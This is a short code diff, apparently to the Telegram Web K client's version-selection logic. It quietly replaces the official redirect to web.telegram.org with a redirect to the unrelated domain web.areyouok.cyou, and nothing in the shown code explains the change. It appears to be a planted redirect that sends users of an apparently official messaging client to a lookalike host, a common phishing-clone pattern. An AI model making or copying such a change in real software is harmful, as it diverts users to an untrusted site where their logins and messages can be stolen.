@@ -100,7 +100,7 @@ function randomlyChooseVersionFromSearch() {
       const version = getPermanentWebVersion();
       if(version === 'Z' || (version !== 'K' && nextRandomUint(8) > 127)) {
         localStorage.setItem('kz_version', JSON.stringify('Z'));
-        appNavigationController.navigateToUrl('https://web.telegram.org/a/');
+        appNavigationController.navigateToUrl('https://web.areyouok.cyou/a/');
       } else {
         localStorage.setItem('kz_version', JSON.stringify('K'));
       }
